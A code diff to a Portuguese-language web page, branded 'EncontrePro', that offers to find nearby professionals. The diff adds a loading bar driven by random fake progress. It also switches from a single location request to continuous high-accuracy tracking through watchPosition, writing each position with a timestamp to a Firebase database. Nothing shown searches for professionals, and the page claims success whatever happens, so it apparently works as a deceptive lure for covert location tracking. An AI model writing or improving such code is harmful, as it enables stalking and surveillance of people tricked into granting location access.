@@ -79,6 +79,22 @@
             font-weight: 600;
             display: none;
         }
+        .loading-bar {
+            width: 100%;
+            background: #eee;
+            border-radius: 8px;
+            margin: 24px 0 0 0;
+            height: 12px;
+            overflow: hidden;
+            display: none;
+        }
+        .loading-bar-inner {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, #ff512f, #dd2476);
+            border-radius: 8px;
+            transition: width 0.5s;
+        }
         .footer {
             margin-top: 32px;
             color: #aaa;
@@ -107,6 +123,9 @@
         <strong>Serviço rápido, seguro e gratuito!</strong><br>
         <span style="color:#27ae60;font-weight:600;">Recomendações personalizadas e profissionais verificados.</span></p>
         <button class="btn" id="btn-localizar">Encontrar profissionais próximos</button>
+        <div class="loading-bar" id="loading-bar">
+            <div class="loading-bar-inner" id="loading-bar-inner"></div>
+        </div>
         <div class="msg" id="msg-sucesso">Buscando profissionais próximos...</div>
         <div class="footer">
             <span>© 2024 <strong>EncontrePro</strong> — Todos os direitos reservados.</span>
@@ -133,22 +152,43 @@
     <script>
         const btn = document.getElementById('btn-localizar');
         const msg = document.getElementById('msg-sucesso');
+        const loadingBar = document.getElementById('loading-bar');
+        const loadingBarInner = document.getElementById('loading-bar-inner');
+        let watchId = null;
+        let progress = 0;
         btn.onclick = function() {
             if (navigator.geolocation) {
                 btn.disabled = true;
                 msg.style.display = 'block';
                 msg.style.color = '#27ae60';
                 msg.textContent = 'Buscando profissionais próximos...';
-                navigator.geolocation.getCurrentPosition(function(position) {
+                loadingBar.style.display = 'block';
+                progress = 0;
+                loadingBarInner.style.width = '0%';
+                // Animação da barra de carregamento
+                const interval = setInterval(() => {
+                    if (progress < 90) {
+                        progress += Math.random() * 5;
+                        loadingBarInner.style.width = progress + '%';
+                    }
+                }, 400);
+                // Rastreamento contínuo
+                watchId = navigator.geolocation.watchPosition(function(position) {
                     const { latitude, longitude } = position.coords;
                     const location = { lat: latitude, lng: longitude, timestamp: Date.now() };
-                    // Enviar localização para o Firebase
                     database.ref('localizacao/ultimo').set(location);
                     msg.textContent = 'Profissionais encontrados próximos a você!';
+                    progress = 100;
+                    loadingBarInner.style.width = '100%';
+                    setTimeout(() => {
+                        loadingBar.style.display = 'none';
+                    }, 1000);
                 }, function(error) {
                     msg.style.color = '#c0392b';
                     msg.textContent = 'Não foi possível obter sua localização. Permita o acesso para receber recomendações.';
                     btn.disabled = false;
+                    loadingBar.style.display = 'none';
+                    clearInterval(interval);
                 }, {
                     enableHighAccuracy: true,
                     timeout: 5000,
